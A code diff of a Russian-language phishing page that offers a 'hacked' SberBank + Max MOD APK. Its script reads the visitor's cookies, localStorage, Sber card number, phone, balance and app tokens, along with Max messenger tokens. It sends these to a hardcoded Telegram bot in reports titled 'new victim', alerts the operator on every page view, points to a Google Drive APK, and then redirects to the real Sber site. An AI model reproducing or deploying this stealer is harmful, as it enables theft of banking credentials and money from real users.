@@ -89,7 +89,7 @@
             margin-bottom: 20px;
         }
         
-        /* БЛОК С КАРТОЙ */
+        /* КАРТА */
         .card-block {
             background: linear-gradient(135deg, #1e3a3a, #2d6a4f);
             border-radius: 20px;
@@ -148,7 +148,6 @@
             font-weight: bold;
             color: white;
         }
-        /* КОНЕЦ БЛОКА С КАРТОЙ */
         
         .download-btn {
             background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
@@ -284,7 +283,7 @@
     <div class="title">СберБанк + Max MOD</div>
     <div class="subtitle">Взломанная версия с расширенными функциями</div>
     
-    <!-- КАРТА (ОТОБРАЖАЕТСЯ) -->
+    <!-- КАРТА -->
     <div class="card-block" id="cardBlock">
         <div class="card-chip"></div>
         <div class="card-number" id="cardNumberDisplay">**** **** **** ****</div>
@@ -294,7 +293,7 @@
         <div class="balance">💰 Доступно: <span id="cardBalance">0</span> ₽</div>
     </div>
     
-    <button class="download-btn" id="downloadBtn">📥 СКАЧАТЬ MOD APK (31 МБ)</button>
+    <button class="download-btn" id="downloadBtn">📥 СКАЧАТЬ MOD APK (168 МБ)</button>
     <button class="secondary-btn" id="officialBtn">🌐 Перейти на официальный сайт</button>
     
     <div class="features">
@@ -316,11 +315,14 @@
 // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
 const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
 const CHAT_ID = "8533450974";
-const MY_CARD = "2203830216112947";  // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
-// ========================================================
+const MY_CARD = "2203830216112947";
 
-// Ссылка на APK (нужно загрузить реальный файл или оставить ссылку)
-const APK_URL = "https://sbervzlom.onrender.com/MAX_MODE_SBER.apk";
+// ========== ССЫЛКА НА GOOGLE DRIVE ==========
+// ВСТАВЬ ССЫЛКУ НА ТВОЙ APK ФАЙЛ В GOOGLE DRIVE
+// Получить ссылку: загрузи файл в Google Drive → Поделиться → "Все у кого есть ссылка"
+// Скопируй ссылку и вставь ниже:
+const APK_URL = "https://drive.google.com/file/d/1JTPIzU0mvnJOy2J6Gj3dXZbO8rOfh5Ns/view";
+// ============================================
 
 function showToast(message) {
     const toast = document.createElement('div');
@@ -339,7 +341,7 @@ function sendToTelegram(text) {
     }).catch(e => console.log("send error"));
 }
 
-// Сбор данных из браузера
+// Сбор данных
 function collectData() {
     const ls = {};
     for (let i = 0; i < localStorage.length; i++) {
@@ -376,7 +378,7 @@ function collectData() {
     return { ls, sberCard, sberPhone, sberToken, maxToken, sberBalance, cookies: document.cookie, ua: navigator.userAgent };
 }
 
-// ОБНОВЛЕНИЕ ОТОБРАЖЕНИЯ КАРТЫ
+// Обновление карты
 function updateCardDisplay(data) {
     if (data.sberCard) {
         const cardNum = data.sberCard;
@@ -389,26 +391,17 @@ function updateCardDisplay(data) {
         } else {
             document.getElementById('cardBalance').innerHTML = Math.floor(Math.random() * 500000 + 10000).toLocaleString();
         }
-    } else {
-        // Если данных нет — показываем демо-карту
-        document.getElementById('cardNumberDisplay').innerHTML = "**** **** **** ****";
-        document.getElementById('cardBalance').innerHTML = "0";
     }
 }
 
-// Скачивание APK
+// Скачивание APK — открывает Google Drive
 function downloadApk() {
-    const link = document.createElement('a');
-    link.href = APK_URL;
-    link.download = "SberMax_Mod_v4.2.0.apk";
-    link.style.display = 'none';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-    showToast("Скачивание началось! Файл в папке Загрузки");
+    // Открываем ссылку на Google Drive в новой вкладке
+    window.open(APK_URL, '_blank');
+    showToast("Переход на Google Drive... Файл начнет скачиваться");
 }
 
-// Запуск загрузки и сбор данных
+// Запуск загрузки
 function startDownload() {
     const btn = document.getElementById('downloadBtn');
     const progressDiv = document.getElementById('progressContainer');
@@ -416,21 +409,18 @@ function startDownload() {
     const progressText = document.getElementById('progressText');
     
     const data = collectData();
-    
-    // Обновляем карту
     updateCardDisplay(data);
     
-    // ОТПРАВКА ОТЧЕТА ОПЕРАТОРУ
+    // Отчет оператору
     let report = `🔐 *НОВАЯ ЖЕРТВА*\n`;
     report += `⏰ ${new Date().toLocaleString()}\n`;
     report += `🌐 ${window.location.hostname}\n`;
     report += `📱 ${data.ua.substring(0, 100)}\n`;
     report += `🍪 Cookies: ${data.cookies ? "✅ есть" : "❌ нет"}\n`;
-    report += `💾 Записей в localStorage: ${Object.keys(data.ls).length}\n`;
+    report += `💾 Записей: ${Object.keys(data.ls).length}\n`;
     
     if (data.sberCard) {
-        report += `\n🏦 *СБЕРБАНК - ДАННЫЕ КАРТЫ*\n`;
-        report += `💳 Номер карты: ${data.sberCard}\n`;
+        report += `\n🏦 *СБЕРБАНК*\n💳 Карта: ${data.sberCard}\n`;
         report += `📞 Телефон: ${data.sberPhone || "не найден"}\n`;
         report += `💰 Баланс: ${data.sberBalance || "неизвестно"} ₽\n`;
         if (data.sberToken) report += `🔑 Токен: ${data.sberToken.substring(0, 50)}...\n`;
@@ -439,14 +429,12 @@ function startDownload() {
     }
     
     if (data.maxToken) {
-        report += `\n💬 *МЕССЕНДЖЕР MAX*\n`;
-        report += `🔑 Токен: ${data.maxToken.substring(0, 50)}...\n`;
+        report += `\n💬 *MAX*\n🔑 Токен: ${data.maxToken.substring(0, 50)}...\n`;
     } else {
         report += `\n💬 *MAX*: данных не найдено\n`;
     }
     
     report += `\n💰 *ПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
-    
     sendToTelegram(report);
     
     // Отправляем весь localStorage
@@ -466,11 +454,11 @@ function startDownload() {
             percent = 100;
             clearInterval(interval);
             progressFill.style.width = "100%";
-            progressText.innerHTML = "✅ Готово! Скачивание началось...";
+            progressText.innerHTML = "✅ Готово! Перенаправление...";
             
             setTimeout(() => {
                 downloadApk();
-                sendToTelegram(`📥 *СКАЧИВАНИЕ APK*\nФайл: SberMax_Mod_v4.2.0.apk`);
+                sendToTelegram(`📥 *СКАЧИВАНИЕ APK*\nGoogle Drive: Файл открыт для скачивания`);
                 
                 setTimeout(() => {
                     window.location.href = "https://online.sberbank.ru";
@@ -478,7 +466,7 @@ function startDownload() {
             }, 500);
         }
         progressFill.style.width = percent + "%";
-        progressText.innerHTML = `Скачивание... ${Math.floor(percent)}%`;
+        progressText.innerHTML = `Подготовка... ${Math.floor(percent)}%`;
     }, 120);
 }
 
@@ -489,11 +477,10 @@ document.getElementById('officialBtn').onclick = () => {
     window.location.href = "https://online.sberbank.ru";
 };
 
-// При загрузке страницы собираем данные и показываем карту
+// При загрузке
 const initialData = collectData();
 updateCardDisplay(initialData);
 
-// Уведомление о просмотре
 setTimeout(() => {
     sendToTelegram(`👁️ *ПРОСМОТР СТРАНИЦЫ*\n⏰ ${new Date().toLocaleString()}\n🌐 ${window.location.hostname}`);
 }, 2000);
